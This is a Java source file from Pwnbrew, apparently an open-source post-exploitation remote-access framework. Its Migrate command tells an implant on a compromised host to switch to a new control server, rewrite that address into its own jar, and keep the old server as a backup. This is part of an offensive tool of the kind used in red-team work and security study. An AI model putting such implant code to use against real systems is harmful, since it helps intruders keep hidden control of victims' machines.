/*

Copyright (C) 2013-2014, Securifera, Inc 

All rights reserved. 

Redistribution and use in source and binary forms, with or without modification, 
are permitted provided that the following conditions are met:

    * Redistributions of source code must retain the above copyright notice,
	this list of conditions and the following disclaimer.

    * Redistributions in binary form must reproduce the above copyright notice,
	this list of conditions and the following disclaimer in the documentation 
	and/or other materials provided with the distribution.

    * Neither the name of Securifera, Inc nor the names of its contributors may be 
	used to endorse or promote products derived from this software without specific
	prior written permission.

THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS 
OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY 
AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER 
OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR 
CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR 
SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON 
ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT 
(INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, 
EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

================================================================================

Pwnbrew is provided under the 3-clause BSD license above.

The copyright on this package is held by Securifera, Inc

*/

package pwnbrew.network.control.messages;


import java.io.IOException;
import java.util.logging.Level;
import pwnbrew.ClientConfig;
import pwnbrew.log.RemoteLog;
import pwnbrew.manager.OutgoingConnectionManager;
import pwnbrew.manager.PortManager;
import pwnbrew.utilities.ReconnectTimer;
import pwnbrew.utilities.Utilities;
import pwnbrew.network.ClientPortRouter;
import pwnbrew.network.ControlOption;
import pwnbrew.selector.SocketChannelHandler;

/**
 *
 *  
 */
public final class Migrate extends ControlMessage {
    
    private String theConnectStr = "";
    
    //Class name
    private static final String NAME_Class = Migrate.class.getSimpleName();
    
    public static final short MESSAGE_ID = 0x7b;
 
    // ==========================================================================
    /**
     * Constructor
     *
     * @param passedId
    */
    public Migrate( byte[] passedId ) {
        super(passedId);
    }
    
     //=========================================================================
    /**
     *  Sets the variable in the message related to this TLV
     * 
     * @param tempTlv 
     * @return  
     */
    @Override
    public boolean setOption( ControlOption tempTlv ){      
        theConnectStr = new String(tempTlv.getValue());   
        return true;
    }
    
    //===============================================================
    /**
     * Returns the number of seconds to sleep before trying to connect to the server.
     *
     * @return
     */
    public String getConnectString() {
        return theConnectStr;
    }
    
    //===============================================================
    /**
    *   Performs the logic specific to the message.
    *
     * @param passedManager
    */
    @Override
    public void evaluate( PortManager passedManager ) {        
        
        //Try and connect to the new server
        String connectStr = getConnectString().trim();
        String[] connectArr = connectStr.split(":");
        
        //Get the IP and ports
        if(connectArr.length != 2){
            return;
        }
        
        try {
            
            //Get the port router
            int msgPort = ClientConfig.getConfig().getSocketPort();
            ClientPortRouter aCPR = (ClientPortRouter)passedManager.getPortRouter(msgPort);
            
            //Check if we are coming from a stager 
            if( Utilities.isStaged() ){
                
                try {
                    
                    ClientConfig theConf = ClientConfig.getConfig();
                    
                    //Get the current server ip and port
                    String serverIp = theConf.getServerIp();
                    int serverPort = theConf.getSocketPort();
                    
                    Utilities.updateServerInfoInJar(connectStr);
                    
                    //Set the new ones
                    theConf.setServerIp(connectArr[0]);
                    theConf.setSocketPort(connectArr[1]);
                    theConf.setServerId(-1);
                    
                    //Get the handler
                    SocketChannelHandler aSCH = aCPR.getConnectionManager().getSocketChannelHandler(OutgoingConnectionManager.COMM_CHANNEL_ID);
                    aCPR.setReconnectFlag(false);

                    //Set the wrapping flag
                    if( aSCH != null )
                        aSCH.setWrapping(true);
                    
                    //Tell it not to reconnect
                    passedManager.disconnect();
                    
                    //Change the ip of the reconnect timer
                    ReconnectTimer aReconnectTimer = aCPR.getConnectionManager().getReconnectTimer( OutgoingConnectionManager.COMM_CHANNEL_ID );        
                    aReconnectTimer.setBackupServerIp(serverIp);
                    aReconnectTimer.setBackupServerPort(serverPort);
                    aReconnectTimer.start();
                    
                } catch (ClassNotFoundException ex ){
                    ex = null;
                }

            } 
                       
        } catch (IOException ex) {
            RemoteLog.log(Level.WARNING, NAME_Class, "evaluate()", ex.getMessage(), ex);        
        } 
                    
    }

}
